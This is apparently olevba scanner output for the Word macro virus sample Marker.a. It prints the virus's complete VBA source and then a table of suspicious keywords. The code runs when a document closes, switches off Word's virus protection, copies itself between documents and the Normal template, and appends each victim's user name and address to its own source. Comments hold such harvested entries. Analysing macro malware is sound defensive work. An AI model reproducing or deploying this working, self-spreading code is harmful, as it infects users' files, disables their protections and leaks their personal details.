olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.a-0149f6ac32fb8a8a0d91137e97b37231a764b867
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.a-0149f6ac32fb8a8a0d91137e97b37231a764b867 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"
Const ExportFile = "c:\netldv.vxd"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim UserAddress As String


'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    ad.Export ExportFile                    'Export from the ActiveDocument

    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    Open ExportFile For Append As #1
    Print #1, "' " & Format(Time, "hh:mm:ss AMPM - ") & _
              Format(Date, "dddd, d mmm yyyy") & _
              Chr(13) & "' " & Application.UserName & _
              Chr(13) & "' " & UserAddress
    Close #1
    
    
    nt.CodeModule.AddFromFile ExportFile    'Import into the NormalTemplate
    nt.CodeModule.DeleteLines 1, 4          'Remove some unnessesary lines
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    nt.Export ExportFile                    'Export from the NormalTemplate
    ad.CodeModule.AddFromFile ExportFile    'Import into the ActiveDocument
    ad.CodeModule.DeleteLines 1, 4          'Remove some unnessesary lines
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
    
    
  Kill ExportFile                           'Delete the file which
                                            'stores the virus's
                                            'source code

End If

End Sub

' 08:26:42  - Sonntag, 22 Nov 1998
' SPo0Ky
' Blue Planet





' 12:48:38  - ïÿòíèöà, 25 äåê 1998
' June 08, 1971
' BOOGZI BARBERS ... Food Buster!!!


' 02:22:53 PM - Tuesday, 27 Feb 2001
' Tester
'


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

